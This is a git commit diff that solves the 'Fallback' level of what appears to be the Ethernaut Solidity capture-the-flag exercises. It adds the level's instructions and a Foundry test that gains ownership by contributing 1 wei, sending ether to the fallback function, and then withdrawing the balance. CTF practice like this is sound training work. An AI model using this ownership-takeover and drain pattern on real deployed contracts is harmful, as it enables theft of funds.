d3f07479e0ff3b03e7050c3b93a49bce28d312d3
islu <38793955+islu@users.noreply.github.com>
2024-04-11 17:55:10 +0800

    clear challenge (fallback)

--- src/levels/Fallback.sol
+++ src/levels/Fallback.sol
@@ -1,6 +1,17 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+// Look carefully at the contract's code below.
+//
+// You will beat this level if
+//  1. you claim ownership of the contract
+//  2. you reduce its balance to 0
+//
+// Things that might help
+//  - How to send ether when interacting with an ABI
+//  - How to send ether outside of the ABI
+//  - Converting to and from wei/ether units (see help() command)
+//  - Fallback methods
 contract Fallback {
     mapping(address => uint256) public contributions;
     address public owner;
--- test/Fallback.t.sol
+++ test/Fallback.t.sol
@@ -4,10 +4,11 @@ pragma solidity ^0.8.0;
 import {EthernautTest} from "./utils/EthernautTest.sol";
 import {FallbackFactory} from "../src/factories/FallbackFactory.sol";
 import {Fallback} from "../src/levels/Fallback.sol";
+import "forge-std/console.sol";
 
 contract FallbackTest is EthernautTest {
     function setUp() public override {
-	super.setUp();
+        super.setUp();
         FallbackFactory factory = new FallbackFactory();
         ethernaut.registerLevel(factory);
         levelAddress = ethernaut.createLevelInstance(factory);
@@ -16,8 +17,22 @@ contract FallbackTest is EthernautTest {
     function testSolveFallback() public {
         Fallback instance = Fallback(payable(levelAddress));
 
-	// insert your code here!
-	
+        // insert your code here!
+
+        console.log("Before owner", instance.owner());
+        // console.log("Before msg.sender", msg.sender);
+
+        instance.contribute{value: 1 wei}();
+        (bool success, ) = levelAddress.call{value: 1 wei}("");
+        require(success);
+
+        console.log("After owner", instance.owner());
+        // console.log("Before msg.sender", msg.sender);
+
+        instance.withdraw();
+
         assert(ethernaut.submitLevelInstance(payable(levelAddress)));
     }
+
+    receive() external payable {}
 }
